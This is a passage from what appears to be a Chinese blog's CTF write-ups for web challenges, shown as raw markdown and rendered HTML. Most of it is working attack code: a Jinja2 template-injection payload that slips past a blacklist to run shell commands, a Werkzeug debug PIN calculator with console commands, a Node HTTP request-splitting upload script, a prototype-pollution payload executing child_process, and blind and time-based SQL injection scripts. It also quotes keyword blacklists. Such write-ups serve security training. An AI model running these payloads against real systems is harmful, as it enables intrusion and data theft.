request.values.get('text') :\n        text = request.values.get(\"text\")\n        text_decode = base64.b64encode(text.encode())\n        tmp = \"结果  :{0}\".format(str(text_decode.decode()))\n        res =  render_template_string(tmp)\n        flash(tmp)\n        return redirect(url_for('encode'))\n\n    else :\n        text = \"\"\n        form = NameForm(text)\n        return render_template(\"index.html\",form = form ,method = \"加密\" ,img = \"flask.png\")\n\n@app.route('/decode',methods=['POST','GET'])\ndef decode():\n    if request.values.get('text') :\n        text = request.values.get(\"text\")\n        text_decode = base64.b64decode(text.encode())\n        tmp = \"结果 ： {0}\".format(text_decode.decode())\n        if waf(tmp) :\n            flash(\"no no no !!\")\n            return redirect(url_for('decode'))\n        res =  render_template_string(tmp)\n        flash( res )\n        return redirect(url_for('decode'))\n\n    else :\n        text = \"\"\n        form = NameForm1(text)\n        return render_template(\"index.html\",form = form, method = \"解密\" , img = \"flask1.png\")\n\n\n@app.route('/<name>',methods=['GET'])\ndef not_found(name):\n    return render_template(\"404.html\",name = name)\n\nif __name__ == '__main__':\n    app.run(host=\"0.0.0.0\", port=5000, debug=True)\n```\n\n可以看见黑名单\n\n```python\n[\"flag\",\"os\",\"system\",\"popen\",\"import\",\"eval\",\"chr\",\"request\",\n                  \"subprocess\",\"commands\",\"socket\",\"hex\",\"base64\",\"*\",\"?\"]\n```\n\n\n\n直接上Vulhub的payload修改一下\n\n```python\n{% for c in [].__class__.__base__.__subclasses__() %}\n{% if c.__name__ == 'catch_warnings' %}\n  {% for b in c.__init__.__globals__.values() %}\n  {% if b.__class__ == {}.__class__ %}\n    {% if 'ev'+'al' in b.keys() %}\n      {{ b['eva'+'l']('__imp'+'ort__(\"o\"+\"s\").pop'+'en(\"id\").read()') }}\n    {% endif %}\n  {% endif %}\n  {% endfor %}\n{% endif %}\n{% endfor %}\n```\n\n查看目录  ls\n\n```bash\napp bin boot dev etc home lib lib64 media mnt opt proc requirements.txt root run sbin srv sys this_is_the_flag.txt tmp usr var \n```\n\n查看flag   cat this_is_the_fl\"+\"ag.txt\n\n```\nflag{93df69f0-3005-414f-a119-c5562af1b167} \n```\n\n想通过计算PIN，但是获取所有信息后计算出来不一致。\n\n\n\n### 另一种解法\n\n计算PIN [参考链接](https://xz.aliyun.com/t/2553)\n\n需要获取六个变量的值\n\n```python\nusername # 用户名\n\nmodname # flask.app\n\ngetattr(app, '__name__', getattr(app.__class__, '__name__')) # Flask\n\ngetattr(mod, '__file__', None) # flask目录下的一个app.py的绝对路径\n\nuuid.getnode() # mac地址十进制  02:42:ae:00:cf:18->2485410385688\n\nget_machine_id() # /etc/machine-id   这里是/proc/self/cgroup  \n12:blkio:/docker/29747fd95662eedc0f932bdacd32401f736d1ebff306b24046b30b43aa287b76 \n```\n\n计算脚本\n\n```python\nimport hashlib\nfrom itertools import chain\nprobably_public_bits = [\n    'flaskweb',# username\n    'flask.app',# modname\n    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))\n    '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),\n]\n\nprivate_bits = [\n    '2485410385688',# str(uuid.getnode()),  /sys/class/net/eth0/address\n    '29747fd95662eedc0f932bdacd32401f736d1ebff306b24046b30b43aa287b76'# get_machine_id(), /etc/machine-id\n]\n\nh = hashlib.md5()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit = bit.encode('utf-8')\n    h.update(bit)\nh.update(b'cookiesalt')\n\ncookie_name = '__wzd' + h.hexdigest()[:20]\n\nnum = None\nif num is None:\n    h.update(b'pinsalt')\n    num = ('%09d' % int(h.hexdigest(), 16))[:9]\n\nrv =None\nif rv is None:\n    for group_size in 5, 4, 3:\n        if len(num) % group_size == 0:\n            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\n                          for x in range(0, len(num), group_size))\n            break\n    else:\n        rv = num\n\nprint(rv)\n```\n\n拿到pin登录\n\n```python\n[console ready]>>> import os\n>>> os.popen(\"ls /\").read()\n'app\\nbin\\nboot\\ndev\\netc\\nhome\\nlib\\nlib64\\nmedia\\nmnt\\nopt\\nproc\\nroot\\nrun\\nsbin\\nsrv\\nsys\\nthis_is_the_flag.txt\\ntmp\\nusr\\nvar\\n'  \n>>> os.popen(\"cat /this_is_the_flag.txt\").read()\n'flag{033e49d3-6201-41c6-9725-e95898cbc3d9}\\n'\n```\n\n\n\n# node_game\n\n经过查找资料，本题是改自于hackim-2020，[出题师傅博客](http://blog.5am3.com/2020/02/11/ctf-node1/)\n\n**题目提示 node 版本为8.12.0**\n\n打开题目有两个选项\n\n![](/pic/117.png)\n\n选择Only admin can use this\n\n是一个文件上传的界面\n\n![](/pic/116.png)\n\n选择Click here to get the source可以查看源码，总共有四条路由和一个黑名单函数\n\n黑名单函数检测下列字符\n\n```\n\"global\",\"process\",\"mainModule\",\"require\",\"root\",\"child_process\",\"exec\",\"\\\"\",\"'\",\"!\"\n```\n\n根路由是获取pug文件渲染后的页面\n\n```js\napp.get('/', function(req, res) {\n    var action = req.query.action?req.query.action:\"index\";\n    if( action.includes(\"/\") || action.includes(\"\\\\\") ){   //action不能包含 ‘/’和‘\\\\’\n        res.send(\"Errrrr, You have been Blocked\");\n    }\n    file = path.join(__dirname + '/template/'+ action +'.pug');\n    var html = pug.renderFile(file);\n    res.send(html);\n});\n```\n\n一条是显示源码\n\n```js\napp.get('/source', function(req, res) {\n    res.sendFile(path.join(__dirname + '/template/source.txt'));\n});\n```\n\n一条是上传文件\n\n```js\napp.post('/file_upload', function(req, res){\n    var ip = req.connection.remoteAddress;\n    var obj = {\n        msg: '',\n    }\n    if (!ip.includes('127.0.0.1')) {   //保证地址是127.0.0.1\n        obj.msg=\"only admin's ip can use it\"\n        res.send(JSON.stringify(obj));\n        return \n    }\n    fs.readFile(req.files[0].path, function(err, data){   //读取文件内容，读取的数据放到data中\n        if(err){\n            obj.msg = 'upload failed';  \n            res.send(JSON.stringify(obj));   //如果读取失败，返回upload failed\n        }else{\n            var file_path = '/uploads/' + req.files[0].mimetype +\"/\";   //file_path为 /uploads/ 加上上传时的Content-Type\n            var file_name = req.files[0].originalname   //file_name为上传时的文件名\n            var dir_file = __dirname + file_path + file_name\n            if(!fs.existsSync(__dirname + file_path)){  \n                try {\n                    fs.mkdirSync(__dirname + file_path)  //检查路径是否存在，如果不存在就创建 \n                } catch (error) {\n                    obj.msg = \"file type error\";\n                    res.send(JSON.stringify(obj));\n                    return\n                }\n            }\n            try {\n                fs.writeFileSync(dir_file,data)  //向上传的文件中写入数据\n                obj = {\n                    msg: 'upload success',\n                    filename: file_path + file_name\n                } \n            } catch (error) {\n                obj.msg = 'upload failed';\n            }\n            res.send(JSON.stringify(obj));    \n        }\n    })\n})\n```\n\n还有一条是代理访问`http://localhost:8081/source`\n这一条就刚好解决了文件上传的IP不是127.0.0.1的问题。\n\n```js\napp.get('/core', function(req, res) {\n    var q = req.query.q;  //获取参数q\n    var resp = \"\";\n    if (q) {\n        var url = 'http://localhost:8081/source?' + q  \n        console.log(url)  //终端打印url\n        var trigger = blacklist(url);  \n        if (trigger === true) {   \n            res.send(\"<p>error occurs!</p>\");   //url中不能包含黑名单中字符，也就是参数q不能包含\n        } else {\n            try {\n                http.get(url, function(resp) {\n                    resp.setEncoding('utf8');\n                    resp.on('error', function(err) {  //处理response流中的error事件\n                    if (err.code === \"ECONNRESET\") {\n                     console.log(\"Timeout occurs\");\n                     return;\n                    }\n                   });\n\n                    resp.on('data', function(chunk) {   ////处理response流中的data事件\n                        try {\n                         resps = chunk.toString();\n                         res.send(resps);\n                        }catch (e) {\n                           res.send(e.message);\n                        }\n \n                    }).on('error', (e) => {\n                         res.send(e.message);});\n                });\n            } catch (error) {\n                console.log(error);\n            }\n        }\n    } else {\n        res.send(\"search param 'q' missing!\");\n    }\n})\n\n```\n\n题目提示了node版本，搜索发现  此版本的http.get存在漏洞\nhttps://xz.aliyun.com/t/2894#toc-2\n\n翻阅pug文档https://pugjs.bootcss.com/language/includes.html\n\n包含flag文件\n\n```\ndoctype html\nhtml\n  head\n    style\n      include ../../../../../../../../../../../flag.txt\n```\n\n使用文件上传路由，然后抓包，再修改一下\n\n>尝试自己编写脚本，但是一直报错，待更新\n\n\n\n附上赵师傅的脚本\n\n```python\nimport urllib.parse\nimport requests\n\npayload = ''' HTTP/1.1\nHost: x\nConnection: keep-alive\n\nPOST /file_upload HTTP/1.1\nContent-Type: multipart/form-data; boundary=--------------------------919695033422425209299810\nConnection: keep-alive\ncache-control: no-cache\nHost: x\nContent-Length: 292\n\n----------------------------919695033422425209299810\nContent-Disposition: form-data; name=\"file\"; filename=\"glzjin.pug\"\nContent-Type: /../template\n\ndoctype html\nhtml\n  head\n    style\n      include ../../../../../../../flag.txt\n\n----------------------------919695033422425209299810--\n\nGET /flag HTTP/1.1\nHost: x\nConnection: close\nx:'''\npayload = payload.replace(\"\\n\", \"\\r\\n\")\npayload = ''.join(chr(int('0xff' + hex(ord(c))[2:].zfill(2), 16)) for c in payload)\nprint(payload)\nr = requests.get('http://3bfb563e-08fd-4430-80c9-4619b1f703e9.node3.buuoj.cn/core?q=' + urllib.parse.quote(payload))\nprint(r.text)\n\nr = requests.get(url+'/?action=glzjin')\nprint(r.text)\n\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n# ezExpress\n\n打开题目是一个登录界面\n\n![](/pic/127.png)\n\n随意输入一下看看404有什么东西，得到了网页的绝对地址/app\n\n![](/pic/130.png)\n\n扫描发现有源码www.zip,先查看route下的源码\n\n```js\n function safeKeyword(keyword) {   //不能包含admin\n  if(keyword.match(/(admin)/is)) {\n      return keyword\n  }\n  return undefined\n}\n\nrouter.post('/login', function (req, res) {\n  if(req.body.Submit==\"register\")\n   if(safeKeyword(req.body.userid)){      //调用safeKeyword函数进行过滤\n    res.end(\"<script>alert('forbid word');history.go(-1);</script>\") \n   }\n    req.session.user={   //将用户名，密码写入session\n      'user':req.body.userid.toUpperCase(),   //将输入转成大写\n      'passwd': req.body.pwd,\n      'isLogin':false\n    }{\n    res.redirect('/'); \n  }\n  else if(req.body.Submit==\"login\"){\n    if(!req.session.user){res.end(\"<script>alert('register first');history.go(-1);</script>\")}\n    if(req.session.user.user==req.body.userid&&req.body.pwd==req.session.user.passwd){\n      req.session.user.isLogin=true;\n    }\n    else{\n      res.end(\"<script>alert('error passwd');history.go(-1);</script>\")\n    }\n  \n  }\n```\n\n觉得`toUpperCase`有点可疑，[查找资料](https://xz.aliyun.com/t/7184#toc-11)后发现\n\n对于toUpperCase():\n\n```\n字符\"ı\"、\"ſ\" 经过toUpperCase处理后结果为 \"I\"、\"S\"\n```\n\n对于toLowerCase():\n\n```\n字符\"K\"经过toLowerCase处理后结果为\"k\"(这个K不是K)\n```\n\n使用adm`ı`n注册  \n\n\n\nmerge、clone 可能触发原型链污染（暂时没有弄懂为什么会造成原型链污染）https://xz.aliyun.com/t/7184#toc-5\n\n```js\nrouter.post('/action', function (req, res) {\n  if(req.session.user.user!=\"ADMIN\"){res.end(\"<script>alert('ADMIN is asked');history.go(-1);</script>\")} \n  req.session.user.data = clone(req.body);\n  res.end(\"<script>alert('success');history.go(-1);</script>\");  \n});\nrouter.get('/info', function (req, res) {\n  res.render('index',data={'user':res.outputFunctionName});\n})\n```\n\n`/action`代码对post传入的数据进行了clone操作,触发原型链污染。render造成代码执行[参考链接]([https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/](https://evi0s.com/2019/08/30/expresslodashejs-从原型链污染到rce/))\n\n传入可造成任意代码执行的数据，提示已经给出，flag在/flag文件中，由于无法显示出来，所以将内容输出到文件，路径已经从404报错页面得到，框架对外显示的路径都是/public/\n\n```http\nPOST /action HTTP/1.1\nHost: f59a86b7-025d-4112-8179-5408079236b0.node3.buuoj.cn\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: application/json\nOrigin: http://f59a86b7-025d-4112-8179-5408079236b0.node3.buuoj.cn\nConnection: close\nReferer: http://f59a86b7-025d-4112-8179-5408079236b0.node3.buuoj.cn/\nCookie: session=s%3AG1zgVNFpJSA-czxyV6IyZ_mCJSStbn_6.Tw40woUQYqkMMTqBQl2SDs8Td0Og%2FepP2NS%2FT24zFK8\nUpgrade-Insecure-Requests: 1\nContent-Length: 133\n\n{\"__proto__\":{\"outputFunctionName\": \"a;global.process.mainModule.require('child_process').exec('cat /flag > /app/public/a.txt');//\"}}\n```\n\n访问/info触发代码执行\n\n![](/pic/129.png)\n\n访问/a.txt得到flag\n\n```\nflag{6d73d1f0-0865-44c3-9851-4e6f38dd58be}\n```\n\n\n\n\n\n参考链接：https://www.zhaoj.in/read-6462.html\n\n","slug":"ichunqiu公益赛web","published":1,"updated":"2020-02-21T06:04:40.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck7vssflz0015pk7e1uueg5vt","content":"<h1 id=\"简单的招聘系统\"><a href=\"#简单的招聘系统\" class=\"headerlink\" title=\"简单的招聘系统\"></a>简单的招聘系统</h1><p>打开题目是一个登入界面，是NULL的大佬出的题目</p>\n<a id=\"more\"></a>\n\n<p><img src=\"/pic/107.png\" alt=\"\"></p>\n<p>简单的注册admin,admin登入，发现在Profile界面发现存在<del>xss</del>slelf-xss 还有一个admin界面，提示需要admin才能访问，不过只能获取自己cookie。这是一个坑。</p>\n<p>实在是想不到怎么办。</p>\n<p>后面想到登入界面可能存在注入,经过测试确实存在sql注入</p>\n<p><img src=\"/pic/109.png\" alt=\"\"></p>\n<p>编写脚本，在里面有坑，编码不一样</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># @Time    : 1/30/2020 9:42 PM</span></span><br><span class=\"line\">import requests</span><br><span class=\"line\"></span><br><span class=\"line\">def get(payload):</span><br><span class=\"line\">    url = <span class=\"string\">'http://3f5788fc3e0d4cd29c4857bd75a3087e9c2af7a010664d15.changame.ichunqiu.com/index.php'</span></span><br><span class=\"line\">    data=&#123;</span><br><span class=\"line\">        <span class=\"string\">'lname'</span> : <span class=\"string\">'admin\\' and '</span>+payload+<span class=\"string\">'#'</span>,</span><br><span class=\"line\">        <span class=\"string\">'lpass'</span> : <span class=\"string\">'admin'</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    cookies=&#123;</span><br><span class=\"line\">        <span class=\"string\">'PHPSESSID'</span> : <span class=\"string\">'bbvvjmdnv20oa9vpub65s4bkr4'</span>,</span><br><span class=\"line\">        <span class=\"string\">'__jsluid_h'</span> : <span class=\"string\">'a36781563be2b33ed295cec9257f1621'</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    html = requests.post(url,data=data,cookies=cookies)</span><br><span class=\"line\">    <span class=\"comment\"># print(html)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> html</span><br><span class=\"line\"></span><br><span class=\"line\">def binsea(s_payload,len=<span class=\"number\">999</span>):</span><br><span class=\"line\">    result = <span class=\"string\">''</span></span><br><span class=\"line\">    x=<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> x &lt;= len :</span><br><span class=\"line\">        error = <span class=\"number\">0</span></span><br><span class=\"line\">        left = <span class=\"number\">0</span></span><br><span class=\"line\">        right = <span class=\"number\">126</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> left &lt;= right:</span><br><span class=\"line\">            mid = (left + right) / <span class=\"number\">2</span></span><br><span class=\"line\">            payload = <span class=\"string\">\"ascii(substr((%s),%d,1))&gt;%d\"</span> % (s_payload,x, mid)</span><br><span class=\"line\"></span><br><span class=\"line\">            res = get(payload)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> res.status_code == <span class=\"number\">404</span> <span class=\"keyword\">or</span> res.status_code == <span class=\"number\">429</span>:</span><br><span class=\"line\">                x=x<span class=\"number\">-1</span></span><br><span class=\"line\">                error = <span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            html=res.text</span><br><span class=\"line\">            <span class=\"comment\"># print('*-*-*-*-*-*', mid)</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">'window.location.href=\"./zhaopin.php\"'</span> in html:</span><br><span class=\"line\">                left = mid +<span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                right = mid <span class=\"number\">-1</span></span><br><span class=\"line\">        mid = int((left + right + <span class=\"number\">1</span>) / <span class=\"number\">2</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> mid == <span class=\"number\">0</span> :</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> error == <span class=\"number\">0</span> :</span><br><span class=\"line\">            result += chr(mid)</span><br><span class=\"line\">            <span class=\"keyword\">print</span>(result)</span><br><span class=\"line\">        x=x+<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\">def get_database():</span><br><span class=\"line\">    s_payload=<span class=\"string\">'database()'</span></span><br><span class=\"line\">    database = binsea(s_payload)</span><br><span class=\"line\">    <span class=\"keyword\">print</span>(database)</span><br><span class=\"line\"></span><br><span class=\"line\">def get_tabls(db):</span><br><span class=\"line\">    s_payload = <span class=\"string\">'select(group_concat(table_name))from(information_schema.tables)where(table_schema=\\''</span>+db+<span class=\"string\">'\\')'</span></span><br><span class=\"line\">    tables=binsea(s_payload)</span><br><span class=\"line\"></span><br><span class=\"line\">def get_columns(table):</span><br><span class=\"line\">    s_payload = <span class=\"string\">'select(group_concat(column_name))from(information_schema.columns)where(table_name=\\''</span>+table+<span class=\"string\">'\\')'</span></span><br><span class=\"line\">    columns=binsea(s_payload)</span><br><span class=\"line\"></span><br><span class=\"line\">def get_data(columns,table):</span><br><span class=\"line\">    s_payload=<span class=\"string\">'select(group_concat('</span>+columns+<span class=\"string\">'))from('</span>+table+<span class=\"string\">')'</span></span><br><span class=\"line\">    password=binsea(s_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get_database() #nzhaopin</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get_tabls('nzhaopin') #backup,flag,user</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get_columns('flag') #id,flaaag</span></span><br><span class=\"line\"></span><br><span class=\"line\">get_data(<span class=\"string\">'flaaag'</span>,<span class=\"string\">'flag'</span>) <span class=\"comment\">#flag&#123;04418836-27b8-4f85-8c53-74f7e3e53350&#125;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"ezupload\"><a href=\"#ezupload\" class=\"headerlink\" title=\"ezupload\"></a>ezupload</h1><p>直接上传php后缀，一句话木马，蚁剑链接，执行/readflag</p>\n<h1 id=\"盲注\"><a href=\"#盲注\" class=\"headerlink\" title=\"盲注\"></a>盲注</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"comment\"># flag在fl4g里</span></span><br><span class=\"line\">    <span class=\"keyword\">include</span> <span class=\"string\">'waf.php'</span>;</span><br><span class=\"line\">    header(<span class=\"string\">\"Content-type: text/html; charset=utf-8\"</span>); </span><br><span class=\"line\">    $db = <span class=\"keyword\">new</span> mysql();</span><br><span class=\"line\"></span><br><span class=\"line\">    $id = $_GET[<span class=\"string\">'id'</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($id) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(check_sql($id))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            $sql = <span class=\"string\">\"select * from flllllllag where id=$id\"</span>;</span><br><span class=\"line\">            $db-&gt;query($sql);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br></pre></td></tr></table></figure>\n\n<p>题目给出了源码，经过测试过滤了如下字符</p>\n<p><img src=\"/pic/110.png\" alt=\"\"></p>\n<p>附上脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get</span><span class=\"params\">(payload)</span>:</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://c4c11f9e99ba4142b9bfc8ed760a65a985f476a30a93485e.changame.ichunqiu.com/?id=0||'</span>+payload+<span class=\"string\">'%23'</span></span><br><span class=\"line\">    html = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># print(url)</span></span><br><span class=\"line\">    <span class=\"comment\"># print(html)</span></span><br><span class=\"line\">    <span class=\"comment\"># return html</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    result=<span class=\"string\">''</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(<span class=\"number\">70</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> range(<span class=\"number\">32</span>,<span class=\"number\">126</span>):</span><br><span class=\"line\">            payload=<span class=\"string\">\"if(ascii(substr(fl4g, %d, 1)) ^ %d, sleep(0), sleep(2))\"</span> %(x,c)</span><br><span class=\"line\">            time1 = time.time()</span><br><span class=\"line\">            get(payload)</span><br><span class=\"line\">            time2 = time.time()</span><br><span class=\"line\">            sec = time2 - time1</span><br><span class=\"line\">            <span class=\"comment\"># print(sec,' ',chr(c))</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> sec &gt;=<span class=\"number\">1.5</span>:</span><br><span class=\"line\">                result+=chr(c)</span><br><span class=\"line\">                print(result)</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ ==<span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"babyphp\"><a href=\"#babyphp\" class=\"headerlink\" title=\"babyphp\"></a>babyphp</h1><p>打开还是一个登入界面，访问<a href=\"http://www.zip发现源码\" target=\"_blank\" rel=\"noopener\">www.zip发现源码</a></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//index.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">require_once</span> <span class=\"string\">\"lib.php\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'action'</span>]))&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">require_once</span>(<span class=\"keyword\">__DIR__</span>.<span class=\"string\">\"/\"</span>.$_GET[<span class=\"string\">'action'</span>].<span class=\"string\">\".php\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>($_SESSION[<span class=\"string\">'login'</span>]==<span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;script&gt;window.location.href='./index.php?action=update'&lt;/script&gt;\"</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;script&gt;window.location.href='./index.php?action=login'&lt;/script&gt;\"</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span 